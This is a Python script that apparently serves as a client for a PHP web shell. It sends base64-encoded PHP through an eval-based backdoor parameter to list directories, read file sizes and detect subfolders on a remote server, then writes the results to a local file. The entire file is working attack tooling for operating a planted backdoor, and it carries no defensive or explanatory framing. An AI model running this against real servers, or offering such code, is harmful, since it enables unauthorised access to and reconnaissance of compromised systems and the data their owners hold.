import sys
import requests
import base64
import os
import codecs
from urllib.parse import urlencode

def is_chinese(word):
	for ch in word:
		if '\u4e00' <= ch <= '\u9fff':
			return 1;
	return 0

url = sys.argv[1]
dir = sys.argv[2]
password = sys.argv[3]
store_dir = sys.argv[4]
data = {}
header = {'Content-Type': 'application/x-www-form-urlencoded'}
filename_url = ''
if ':' in url:
	filename_url = url.replace('http://','').replace('.php','').replace('/','').replace(':','').replace('\\','').replace('.','')
else:
	filename_url = url.replace('http://','').replace('.php','').replace('/','').replace('\\','').replace('.','')
filename_temp = f'dir.txt'
mulu = dir.replace('\\','').replace(':','').replace('/','')
filename = f'{store_dir}{filename_url}-{mulu}.txt'
value = f'echo implode(",",scandir("{dir}"));'
flag = is_chinese(dir)
if flag == 0:
	value = str(base64.b64encode(value.encode('utf-8')),'utf-8')
	data = {password:'eval(base64_decode($_POST[\'x\']));','x':value}
if flag == 1:
	data = {password:value}
data = urlencode(data,encoding='gb2312')
r = requests.post(url=url,data=data,headers=header)
print(r)
print(r.text)
with open(filename_temp,'wb+') as f:
	f.write(r.content)
lines = ''
filenamesize = ''
with open(filename_temp,'r+') as f1:
	lines = f1.read()
list = lines.split(',')
data1 = {}
with codecs.open(filename,'w',encoding='utf-8') as f2:
	for line in list:
		if '.' in line:
			try:
				value1 = f'echo filesize("{dir}\\\{line}");'
				flag1 = is_chinese(value)
				if flag1 == 0:
					value1 = str(base64.b64encode(value1.encode('utf-8')),'utf-8')
					data1 = {password:'eval(base64_decode($_POST[\'x\']));','x':value1}
				if flag1 == 1:
					data1 = {password:value}
				data1 = urlencode(data1,encoding='gb2312')
				html = requests.post(url=url,data=data1,headers=header)
				size = html.text
				size = int(size)
				if size == 0:
					open('sslkssosks','r')
				if size < 1024:
					filenamesize = str(size) + 'B'
				else:
					size = size/1024
					if size < 1024:
						size = str(size)
						if '.' in size:
							list1 = size.split('.')
							filenamesize = str(list1[0]) + 'KB'		
					else:
						size = size/1024
						filenamesize = str(size).split('.')[0] + 'MB'
			except:
				if dir[-1:]!='/':
					dir = dir + '/'
				filename_path = dir + line
				value2 = f'echo is_dir("{filename_path}")?1:0;'
				print(value2)
				flag2 = is_chinese(value2)
				if flag2 == 0:
					data2 = {password:value2}
				if flag2 == 1:
					data2 = {password:value2}
				data2 = urlencode(data2,encoding='gb2312')
				print(data2)
				s = requests.post(url=url,data=data2,headers=header)
				print(s.text)
				if s.text == '1':
					filenamesize = 'mulu'
				else:
					filenamesize = 'error'
		line = line + ':' + filenamesize
		filenamesize = ''
		f2.write(line+'\r\n')
os.remove(filename_temp)